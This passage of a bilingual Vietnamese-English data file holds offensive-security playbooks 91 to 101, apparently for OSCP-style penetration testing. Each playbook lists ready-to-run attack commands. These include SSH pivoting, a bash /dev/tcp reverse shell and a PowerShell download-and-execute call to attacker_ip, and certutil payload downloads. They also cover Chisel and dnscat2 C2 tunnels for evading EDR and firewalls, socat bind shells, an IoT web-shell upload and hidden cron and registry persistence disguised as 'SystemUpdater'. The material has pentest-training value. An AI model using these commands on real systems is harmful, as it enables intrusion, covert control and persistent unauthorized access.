...
const PLAYBOOKS = {
 ...
 // Playbooks 61-90
  ...
  {
  "playbook_91_ssh_local_forwarding": {
    "title": {
      "vi": "Playbook 91: Truy cập Cổng Dịch vụ Nội bộ với SSH Local Port Forwarding",
      "en": "Playbook 91: Access Internal Service Port with SSH Local Port Forwarding"
    },
    "assumption": "Đã chiếm được quyền truy cập SSH (hoặc bất kỳ shell nào có thể chạy SSH/Chisel client) vào máy Pivot (Machine A) và cần truy cập dịch vụ (ví dụ: PostgreSQL) trên máy Target-DB (Machine B) trong mạng nội bộ.",
    "objective": "Chuyển tiếp cổng dịch vụ nội bộ (ví dụ: 5432) từ máy Target-DB đến máy Attacker để tương tác trực tiếp.",
    "tools": ["ssh", "psql", "sqlcmd", "chisel", "socat"],
    "phases": ["Post-Exploitation", "Pivoting"],
    "techniques": ["Local Port Forwarding", "Tunneling"],
    "targets": ["Internal Service Ports (TCP)"],
    "os": ["Linux", "Windows (với SSH client)"],
    "tags": ["pivoting", "ssh", "tunneling", "local_forwarding", "postexploitation", "oscp"],
    "content": "## Playbook 91: Truy cập Cổng Dịch vụ Nội bộ với SSH Local Port Forwarding 🛡️➡️💻\n\n**Giả định:** Đã chiếm được quyền truy cập SSH vào máy Pivot (Machine A) và cần truy cập dịch vụ (ví dụ: PostgreSQL) trên máy Target-DB (Machine B) trong mạng nội bộ.\n\n**Mục tiêu:** Chuyển tiếp cổng dịch vụ nội bộ (ví dụ: 5432) từ máy Target-DB đến máy Attacker để tương tác trực tiếp.\n\n**Các bước thực hiện:**\n\n1.  **Thiết lập SSH Local Forwarding:** Chạy lệnh trên máy Attacker.\n2.  **Xác minh Tunnel:** Kiểm tra cổng 5432 trên 127.0.0.1 của máy Attacker.\n3.  **Tương tác với Dịch vụ:** Dùng client tương ứng kết nối đến localhost:5432.",
    "steps": [
      { "vi": "**Lệnh SSH Forwarding:**", "en": "**SSH Forwarding Command:**", "command": "ssh -L 5432:192.168.1.10:5432 user@pivot_ip" },
      { "vi": "**Kết nối tới DB:**", "en": "**Connect to DB:**", "command": "psql -h 127.0.0.1 -p 5432 -U db_user -d db_name" }
    ],
    "related_knowledge_ids": ["ssh_tunneling", "pivot_technique", "postgresql_exploitation"]
  },
  "playbook_92_reverse_shell_outbound_only": {
    "title": {
      "vi": "Playbook 92: Khai thác Reverse Shell qua Tường lửa Outbound Only",
      "en": "Playbook 92: Reverse Shell Exploitation via Outbound Only Firewall"
    },
    "assumption": "Mục tiêu chỉ cho phép lưu lượng mạng đi ra (Outbound) nhưng chặn lưu lượng mạng đi vào (Inbound).",
    "objective": "Thiết lập một kết nối shell ngược (Reverse Shell) để vượt qua quy tắc tường lửa Inbound, sử dụng các cổng được phép (ví dụ: 80, 443, 53).",
    "tools": ["netcat", "socat", "msfvenom", "powercat"],
    "phases": ["Exploitation", "C2"],
    "techniques": ["Reverse Shell", "Evasion via Common Ports"],
    "targets": ["Any"],
    "os": ["Linux", "Windows"],
    "tags": ["reverse_shell", "firewall_evasion", "outbound", "netcat", "socat", "payload"],
    "content": "## Playbook 92: Khai thác Reverse Shell qua Tường lửa Outbound Only 🔥\n\n**Giả định:** Mục tiêu chỉ cho phép lưu lượng mạng đi ra (Outbound) nhưng chặn lưu lượng mạng đi vào (Inbound).\n\n**Mục tiêu:** Thiết lập một kết nối shell ngược (Reverse Shell) để vượt qua quy tắc tường lửa Inbound, sử dụng các cổng được phép (ví dụ: 80, 443, 53).\n\n**Các bước thực hiện:**\n\n1.  **Thiết lập Listener:** Khởi động một listener trên máy Attacker bằng cổng được dự đoán là cho phép Outbound (ví dụ: 443).\n2.  **Tạo và Gửi Payload:** Tạo payload reverse shell nhắm đến IP và cổng của Attacker.\n3.  **Thực thi Payload:** Khởi động payload trên máy mục tiêu để máy mục tiêu kết nối ngược lại Attacker.",
    "steps": [
      { "vi": "**Attacker Listener:**", "en": "**Attacker Listener:**", "command": "nc -lvnp 443" },
      { "vi": "**Victim Netcat Reverse Shell (Linux):**", "en": "**Victim Netcat Reverse Shell (Linux):**", "command": "bash -i >& /dev/tcp/attacker_ip/443 0>&1" },
      { "vi": "**Victim PowerShell Reverse Shell (Windows):**", "en": "**Victim PowerShell Reverse Shell (Windows):**", "command": "powershell -c \"iex(new-object net.webclient).downloadstring('http://attacker_ip/rev.ps1')\"" }
    ],
    "related_knowledge_ids": ["reverse_shell_types", "firewall_rules", "netcat_socat"]
  },
  "playbook_93_full_internal_enumeration": {
    "title": {
      "vi": "Playbook 93: Quét và Liệt kê Toàn diện Mạng Nội bộ (Internal Pivoting)",
      "en": "Playbook 93: Comprehensive Internal Network Scanning and Enumeration (Internal Pivoting)"
    },
    "assumption": "Đã có shell trên một máy Pivot và cần xác định tất cả các máy chủ và dịch vụ khác trong mạng nội bộ (ví dụ: 192.168.1.0/24).",
    "objective": "Thiết lập SOCKS Proxy để định tuyến lưu lượng quét Nmap/dò tìm qua máy Pivot, sau đó thực hiện quét toàn bộ mạng nội bộ.",
    "tools": ["nmap", "proxychains", "ssh", "chisel", "meterpreter"],
    "phases": ["Pivoting", "Enumeration"],
    "techniques": ["SOCKS Proxy", "Dynamic Port Forwarding", "Internal Scanning"],
    "targets": ["Internal Networks"],
    "os": ["Linux (Attacker)"],
    "tags": ["pivoting", "proxychains", "socks_proxy", "internal_scan", "nmap"],
    "content": "## Playbook 93: Quét và Liệt kê Toàn diện Mạng Nội bộ 📡\n\n**Giả định:** Đã có shell trên một máy Pivot và cần xác định tất cả các máy chủ và dịch vụ khác trong mạng nội bộ (ví dụ: 192.168.1.0/24).\n\n**Mục tiêu:** Thiết lập SOCKS Proxy để định tuyến lưu lượng quét Nmap/dò tìm qua máy Pivot, sau đó thực hiện quét toàn bộ mạng nội bộ.\n\n**Các bước thực hiện:**\n\n1.  **Tạo SOCKS Proxy:** Dùng SSH (Dynamic Port Forwarding) hoặc Chisel để thiết lập proxy SOCKS (ví dụ: trên cổng 1080) từ Attacker đến Pivot.\n2.  **Cấu hình Proxychains:** Cập nhật `/etc/proxychains4.conf` để trỏ đến SOCKS Proxy (127.0.0.1:1080).\n3.  **Quét Nmap qua Tunnel:** Sử dụng Proxychains để chạy Nmap quét mạng nội bộ.",
    "steps": [
      { "vi": "**Thiết lập SOCKS Proxy (SSH):**", "en": "**Set up SOCKS Proxy (SSH):**", "command": "ssh -D 1080 user@pivot_ip" },
      { "vi": "**Quét mạng nội bộ bằng Proxychains:**", "en": "**Scan Internal Network with Proxychains:**", "command": "proxychains nmap -sT -Pn -sV 192.168.1.0/24" }
    ],
    "related_knowledge_ids": ["socks_proxy_creation", "proxychains_usage", "internal_recon"]
  },
  "playbook_94_lolbins_backdoor": {
    "title": {
      "vi": "Playbook 94: Thực thi và Tải xuống Payload bằng LOLBins (Windows)",
      "en": "Playbook 94: Payload Execution and Download using LOLBins (Windows)"
    },
    "assumption": "Đã có một lệnh thực thi (code execution) trên Windows Server không có các công cụ tấn công ngoại vi (ví dụ: `curl`, `wget`).",
    "objective": "Tận dụng các công cụ có sẵn trên hệ điều hành (LOLBins) như `certutil` hoặc PowerShell để tải xuống và thực thi backdoor/shell.",
    "tools": ["certutil", "powershell", "bitsadmin"],
    "phases": ["Delivery", "Execution"],
    "techniques": ["Living Off The Land (LOTL)", "LOLBins", "File Transfer Evasion"],
    "targets": ["Windows Server"],
    "os": ["Windows"],
    "tags": ["windows", "lolbins", "certutil", "powershell", "evasion", "persistence"],
    "content": "## Playbook 94: Thực thi và Tải xuống Payload bằng LOLBins 🖼️\n\n**Giả định:** Đã có một lệnh thực thi (code execution) trên Windows Server không có các công cụ tấn công ngoại vi.\n\n**Mục tiêu:** Tận dụng các công cụ có sẵn trên hệ điều hành (LOLBins) như `certutil` hoặc PowerShell để tải xuống và thực thi backdoor/shell.\n\n**Các bước thực hiện:**\n\n1.  **Host Payload:** Thiết lập HTTP server trên Attacker (ví dụ: `python3 -m http.server 80`).\n2.  **Tải xuống Payload:** Dùng `certutil` hoặc PowerShell để tải file.\n3.  **Thực thi:** Khởi chạy file đã tải (ví dụ: `nc.exe` reverse shell).",
    "steps": [
      { "vi": "**Tải xuống bằng Certutil:**", "en": "**Download with Certutil:**", "command": "certutil.exe -urlcache -f http://attacker_ip/payload.exe C:\\Users\\Public\\payload.exe" },
      { "vi": "**Tải xuống bằng PowerShell:**", "en": "**Download with PowerShell:**", "command": "powershell -c \"(New-Object System.Net.WebClient).DownloadFile('http://attacker_ip/payload.exe', 'C:\\payload.exe')\"" }
    ],
    "related_knowledge_ids": ["certutil_misuse", "powershell_downloads", "lolbins_techniques"]
  },
  "playbook_95_encrypted_c2_tunnel": {
    "title": {
      "vi": "Playbook 95: Thiết lập C2 Tunnel mã hóa để Né tránh EDR/Giám sát",
      "en": "Playbook 95: Establishing Encrypted C2 Tunnel for EDR/Monitoring Evasion"
    },
    "assumption": "Mục tiêu có các giải pháp Giám sát Mạng (ví dụ: IDS/IPS) hoặc EDR phát hiện các traffic shell không mã hóa (ví dụ: Netcat).",
    "objective": "Sử dụng các công cụ tạo tunnel mã hóa (Chisel, SSH) để ẩn lưu lượng Command and Control (C2) bên trong các giao thức mã hóa thông thường (ví dụ: SSL/TLS trên 443).",
    "tools": ["chisel", "ssh", "meterpreter (https payload)"],
    "phases": ["C2", "Evasion"],
    "techniques": ["Encrypted Tunneling", "Traffic Obfuscation", "Persistence"],
    "targets": ["Network Traffic"],
    "os": ["Any"],
    "tags": ["evasion", "encrypted", "chisel", "ssh", "c2", "stealth"],
    "content": "## Playbook 95: Thiết lập C2 Tunnel mã hóa để Né tránh EDR/Giám sát 👻\n\n**Giả định:** Mục tiêu có các giải pháp Giám sát Mạng (IDS/IPS) hoặc EDR phát hiện các traffic shell không mã hóa.\n\n**Mục tiêu:** Sử dụng các công cụ tạo tunnel mã hóa (Chisel, SSH) để ẩn lưu lượng Command and Control (C2) bên trong các giao thức mã hóa thông thường (ví dụ: SSL/TLS trên 443).\n\n**Các bước thực hiện:**\n\n1.  **Chạy Chisel Server:** Khởi động server Chisel trên Attacker (thường trên cổng 443 để ẩn danh).\n2.  **Chạy Chisel Client:** Upload và chạy client Chisel trên Victim để tạo Reverse Tunnel.\n3.  **Sử dụng SOCKS Proxy:** Kết nối các công cụ tấn công khác qua SOCKS Proxy được tạo bởi Chisel.",
    "steps": [
      { "vi": "**Attacker Chisel Server (TCP/443):**", "en": "**Attacker Chisel Server (TCP/443):**", "command": "chisel server -p 443 --reverse" },
      { "vi": "**Victim Chisel Client (Reverse Tunnel):**", "en": "**Victim Chisel Client (Reverse Tunnel):**", "command": "chisel client attacker_ip:443 R:1080:socks" }
    ],
    "related_knowledge_ids": ["chisel_usage", "traffic_encryption", "c2_frameworks"]
  },
  "playbook_96_socket_reuse_crash": {
    "title": {
      "vi": "Playbook 96: Tái sử dụng Socket sau khi Dịch vụ bị Crash/Giải phóng Cổng",
      "en": "Playbook 96: Socket Reuse after Service Crash/Port Release"
    },
    "assumption": "Một dịch vụ mục tiêu (ví dụ: web server, custom app) đã bị crash do khai thác và giải phóng cổng, nhưng cổng đó có thể đang ở trạng thái TIME_WAIT.",
    "objective": "Sử dụng tùy chọn `SO_REUSEADDR` hoặc các công cụ hỗ trợ để buộc tái sử dụng cổng ngay lập tức, cho phép thiết lập Listener mới nhanh chóng.",
    "tools": ["socat", "python (socket module)", "netcat (tùy phiên bản)"],
    "phases": ["Exploitation", "Post-Exploitation"],
    "techniques": ["Socket Programming", "SO_REUSEADDR", "Persistence"],
    "targets": ["TIME_WAIT Ports"],
    "os": ["Linux", "Windows"],
    "tags": ["socket", "reuse", "crash", "persistence", "socat", "time_wait"],
    "content": "## Playbook 96: Tái sử dụng Socket sau khi Dịch vụ bị Crash/Giải phóng Cổng ♻️\n\n**Giả định:** Một dịch vụ mục tiêu đã bị crash do khai thác và giải phóng cổng, nhưng cổng đó có thể đang ở trạng thái TIME_WAIT.\n\n**Mục tiêu:** Sử dụng tùy chọn `SO_REUSEADDR` hoặc các công cụ hỗ trợ để buộc tái sử dụng cổng ngay lập tức.\n\n**Các bước thực hiện:**\n\n1.  **Khai thác Crash:** Thực hiện khai thác khiến dịch vụ mục tiêu crash.\n2.  **Kiểm tra Trạng thái Cổng:** Xác định cổng đang ở trạng thái TIME_WAIT.\n3.  **Thiết lập Listener với SO_REUSEADDR:** Dùng Socat để thiết lập listener mới trên cổng đó với tùy chọn tái sử dụng socket.",
    "steps": [
      { "vi": "**Thiết lập Listener Socat với Tái sử dụng:**", "en": "**Set up Socat Listener with Reuse:**", "command": "socat TCP4-LISTEN:80,reuseaddr,fork EXEC:/bin/bash" },
      { "vi": "**Kiểm tra (Linux):**", "en": "**Check (Linux):**", "command": "netstat -tuln | grep 80" }
    ],
    "related_knowledge_ids": ["socket_programming", "socat_advanced", "network_states"]
  },
  "playbook_97_split_tunneling_routing_analysis": {
    "title": {
      "vi": "Playbook 97: Phân tích và Khai thác Bảng Định tuyến (Split Tunneling)",
      "en": "Playbook 97: Routing Table Analysis and Exploitation (Split Tunneling)"
    },
    "assumption": "Máy Pivot sử dụng Split Tunneling (chỉ một phần traffic đi qua tunnel VPN) hoặc có cấu hình định tuyến phức tạp.",
    "objective": "Phân tích bảng định tuyến để xác định các mạng nội bộ có thể truy cập, sau đó định tuyến lưu lượng tấn công một cách chính xác qua SOCKS Proxy.",
    "tools": ["route", "ip", "netstat", "proxychains"],
    "phases": ["Pivoting", "Reconnaissance"],
    "techniques": ["Routing Analysis", "SOCKS Proxy Pivoting", "Split Tunneling Bypass"],
    "targets": ["Routing Table"],
    "os": ["Linux", "Windows"],
    "tags": ["routing", "split_tunneling", "vpn", "ip_route", "netstat", "pivoting"],
    "content": "## Playbook 97: Phân tích và Khai thác Bảng Định tuyến 🗺️\n\n**Giả định:** Máy Pivot sử dụng Split Tunneling hoặc có cấu hình định tuyến phức tạp.\n\n**Mục tiêu:** Phân tích bảng định tuyến để xác định các mạng nội bộ có thể truy cập, sau đó định tuyến lưu lượng tấn công một cách chính xác qua SOCKS Proxy.\n\n**Các bước thực hiện (Trên Pivot):**\n\n1.  **Phân tích Bảng Định tuyến:** Liệt kê các gateway và interface để tìm các mạng nội bộ khác.\n2.  **Xác định Mạng Nội bộ:** Ghi lại dải IP của các mạng nội bộ (ví dụ: 172.16.x.x/16).\n3.  **Thiết lập Proxy:** Dùng SOCKS Proxy (xem Playbook 93) để tấn công các dải IP đã xác định.",
    "steps": [
      { "vi": "**Kiểm tra Routing (Linux):**", "en": "**Check Routing (Linux):**", "command": "ip route show / route -n" },
      { "vi": "**Kiểm tra Routing (Windows):**", "en": "**Check Routing (Windows):**", "command": "route print" }
    ],
    "related_knowledge_ids": ["network_routing", "pivoting_advanced", "split_tunneling_security"]
  },
  "playbook_98_dns_tunneling": {
    "title": {
      "vi": "Playbook 98: Thiết lập C2 Tunnel qua DNS để Né tránh Tường lửa",
      "en": "Playbook 98: Establishing C2 Tunnel via DNS for Firewall Evasion"
    },
    "assumption": "Tường lửa kiểm soát nghiêm ngặt traffic HTTP/S, nhưng cho phép DNS (UDP/53) ra ngoài (thường là mặc định).",
    "objective": "Mã hóa và truyền tải lưu lượng Command and Control (C2) bên trong các truy vấn và phản hồi DNS, sử dụng các công cụ DNS Tunneling.",
    "tools": ["dnscat2", "iodine"],
    "phases": ["C2", "Evasion"],
    "techniques": ["DNS Tunneling", "Exfiltration", "Stealth C2"],
    "targets": ["DNS Traffic (UDP/53)"],
    "os": ["Linux", "Windows"],
    "tags": ["dns", "tunneling", "evasion", "c2", "udp", "dnscat2", "iodine"],
    "content": "## Playbook 98: Thiết lập C2 Tunnel qua DNS để Né tránh Tường lửa ✉️\n\n**Giả định:** Tường lửa kiểm soát nghiêm ngặt traffic HTTP/S, nhưng cho phép DNS (UDP/53) ra ngoài.\n\n**Mục tiêu:** Mã hóa và truyền tải lưu lượng Command and Control (C2) bên trong các truy vấn và phản hồi DNS.\n\n**Các bước thực hiện:**\n\n1.  **Cấu hình DNS:** Đăng ký tên miền (ví dụ: `c2.attacker.com`) và trỏ bản ghi NS đến IP của Attacker.\n2.  **Chạy DNS Server:** Khởi động `dnscat2` Server trên Attacker.\n3.  **Chạy DNS Client:** Chạy `dnscat2` Client trên Victim, kết nối đến domain đã cấu hình.",
    "steps": [
      { "vi": "**Attacker DNS Server:**", "en": "**Attacker DNS Server:**", "command": "dnscat2 --secret=[key] --domain c2.attacker.com" },
      { "vi": "**Victim DNS Client:**", "en": "**Victim DNS Client:**", "command": "./dnscat2 --secret=[key] --host c2.attacker.com" }
    ],
    "related_knowledge_ids": ["dns_tunneling_mechanisms", "network_protocol_evasion", "dnscat2_usage"]
  },
  "playbook_99_internal_non_internet_c2": {
    "title": {
      "vi": "Playbook 99: Thiết lập C2 Nội bộ Không phụ thuộc vào Internet",
      "en": "Playbook 99: Establishing Internal Non-Internet Dependent C2"
    },
    "assumption": "Đã có một foothold và cần duy trì/mở rộng truy cập trong mạng nội bộ, không muốn tạo thêm outbound traffic dễ bị giám sát.",
    "objective": "Sử dụng các giao thức nội bộ (ví dụ: TCP, UDP) hoặc các kênh giao tiếp không chuẩn để thiết lập kênh C2 giữa các máy đã bị khai thác trong mạng nội bộ.",
    "tools": ["netcat", "socat", "SMB/WMI/RPC"],
    "phases": ["C2", "Lateral Movement"],
    "techniques": ["Internal C2", "Non-standard Protocol C2", "Peer-to-Peer Shells"],
    "targets": ["Internal Traffic"],
    "os": ["Any"],
    "tags": ["internal", "c2", "lateral_movement", "netcat", "stealth"],
    "content": "## Playbook 99: Thiết lập C2 Nội bộ Không phụ thuộc vào Internet 🕸️\n\n**Giả định:** Đã có một foothold và cần duy trì/mở rộng truy cập trong mạng nội bộ.\n\n**Mục tiêu:** Sử dụng các giao thức nội bộ hoặc các kênh giao tiếp không chuẩn để thiết lập kênh C2 giữa các máy đã bị khai thác trong mạng nội bộ.\n\n**Các bước thực hiện:**\n\n1.  **Khởi tạo Listener:** Thiết lập `socat` listener trên máy **Pivot 2** (máy tiếp theo trong mạng nội bộ).\n2.  **Reverse/Bind Shell Nội bộ:** Dùng một máy **Pivot 1** đã bị khai thác để kết nối shell đến **Pivot 2**.",
    "steps": [
      { "vi": "**Pivot 2 (Listener):**", "en": "**Pivot 2 (Listener):**", "command": "socat TCP4-LISTEN:8080 EXEC:/bin/bash" },
      { "vi": "**Pivot 1 (Reverse Shell):**", "en": "**Pivot 1 (Reverse Shell):**", "command": "bash -i >& /dev/tcp/pivot_2_ip/8080 0>&1" }
    ],
    "related_knowledge_ids": ["lateral_movement_techniques", "internal_network_scanning", "socat_pivoting"]
  },
  "playbook_100_iot_mobile_backdoor": {
    "title": {
      "vi": "Playbook 100: Khai thác và Thiết lập Backdoor trên Thiết bị IoT/Di động",
      "en": "Playbook 100: Exploitation and Backdoor Setup on IoT/Mobile Devices"
    },
    "assumption": "Thiết bị mục tiêu là IoT/Di động có tài nguyên hạn chế, không có SSH/đã loại bỏ các công cụ tiêu chuẩn, nhưng có lỗ hổng dịch vụ hoặc web/API.",
    "objective": "Tận dụng lỗ hổng, upload và thực thi một reverse shell/backdoor nhỏ, tĩnh (ví dụ: Netcat tĩnh, script shell đơn giản) hoặc thông qua lỗ hổng Web/API.",
    "tools": ["static netcat", "busybox", "python/perl/lua shell scripts", "web shell"],
    "phases": ["Exploitation", "Persistence"],
    "techniques": ["Custom Backdoors", "Web Shell Upload", "Binary Stripping"],
    "targets": ["IoT/Mobile OS (BusyBox, RTOS)"],
    "os": ["Embedded Linux", "RTOS"],
    "tags": ["iot", "mobile", "embedded", "busybox", "web_shell", "reverse_shell"],
    "content": "## Playbook 100: Khai thác và Thiết lập Backdoor trên Thiết bị IoT/Di động 📱\n\n**Giả định:** Thiết bị mục tiêu là IoT/Di động có tài nguyên hạn chế, không có SSH/đã loại bỏ các công cụ tiêu chuẩn.\n\n**Mục tiêu:** Tận dụng lỗ hổng, upload và thực thi một reverse shell/backdoor nhỏ, tĩnh hoặc thông qua lỗ hổng Web/API.\n\n**Các bước thực hiện:**\n\n1.  **Xác định Lỗ hổng:** Tìm kiếm lỗ hổng web, API hoặc các dịch vụ quản trị (Telnet, Serial).\n2.  **Upload Backdoor:** Dùng lỗ hổng để tải lên một binary tĩnh (ví dụ: `nc` tĩnh, `busybox` binary).\n3.  **Thực thi:** Chạy reverse shell hoặc thiết lập persistence.",
    "steps": [
      { "vi": "**Upload qua Lỗ hổng Web:**", "en": "**Upload via Web Vulnerability:**", "command": "curl -F 'file=@static_nc' http://target_ip/upload.php" },
      { "vi": "**Thực thi Reverse Shell (BusyBox):**", "en": "**Execute Reverse Shell (BusyBox):**", "command": "./nc target_ip 443 -e /bin/sh" }
    ],
    "related_knowledge_ids": ["iot_exploitation", "busybox_usage", "embedded_security"]
  },
  "playbook_101_stealth_persistence": {
    "title": {
      "vi": "Playbook 101: Duy trì Truy cập Dài hạn và Ẩn danh (Persistence & Stealth)",
      "en": "Playbook 101: Long-term Stealth Persistence and Access Maintenance"
    },
    "assumption": "Đã có quyền truy cập root/administrator và cần duy trì truy cập một cách bí mật qua các phiên reboot và giám sát.",
    "objective": "Thiết lập các cơ chế persistence khó bị phát hiện (ví dụ: cronjob ẩn, service tùy chỉnh, Registry key) và sử dụng tunnel mã hóa để giảm thiểu dấu vết.",
    "tools": ["cron", "systemd", "registry", "chisel", "SSH"],
    "phases": ["Persistence", "C2", "Evasion"],
    "techniques": ["Job Scheduler Persistence", "Service Persistence", "Traffic Obfuscation", "Process Hiding"],
    "targets": ["OS Boot Process", "Network Traffic"],
    "os": ["Linux", "Windows"],
    "tags": ["persistence", "stealth", "cronjob", "service", "registry", "long_term"],
    "content": "## Playbook 101: Duy trì Truy cập Dài hạn và Ẩn danh ⏳\n\n**Giả định:** Đã có quyền truy cập root/administrator và cần duy trì truy cập một cách bí mật qua các phiên reboot và giám sát.\n\n**Mục tiêu:** Thiết lập các cơ chế persistence khó bị phát hiện và sử dụng tunnel mã hóa để giảm thiểu dấu vết.\n\n**Các bước thực hiện (Ví dụ Linux):**\n\n1.  **Sao chép Binary:** Đặt `chisel` client vào một thư mục ít bị kiểm tra (ví dụ: `/var/tmp/.config/`).\n2.  **Thiết lập Cronjob Ẩn:** Thêm cronjob chạy tunnel reverse Chisel mỗi khi hệ thống khởi động.\n3.  **Che giấu Tên Tiến trình:** Đổi tên tiến trình (process) thành một tên hợp pháp nếu có thể.",
    "steps": [
      { "vi": "**Thêm Cronjob (Root):**", "en": "**Add Cronjob (Root):**", "command": "echo '@reboot /var/tmp/.config/chisel client attacker_ip:443 R:1080:socks' | crontab -" },
      { "vi": "**Persistence (Windows Registry):**", "en": "**Persistence (Windows Registry):**", "command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"SystemUpdater\" /t REG_SZ /d \"C:\\ProgramData\\chisel.exe client ...\" /f" }
    ],
    "related_knowledge_ids": ["persistence_linux", "persistence_windows", "chisel_for_persistence"]
  }
}
